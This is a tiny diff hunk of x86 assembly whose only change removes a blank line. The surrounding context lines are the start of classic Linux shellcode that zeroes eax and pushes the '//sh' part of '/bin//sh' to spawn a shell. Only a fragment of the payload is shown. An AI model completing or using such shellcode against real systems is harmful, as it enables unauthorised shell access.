@@ -7,7 +7,6 @@ section .text
 
 	_start:
 		
-
 	   	xor    eax,eax		; eax=NULL
     	   	push   eax		
     		push   0x68732f2f	; hs//	
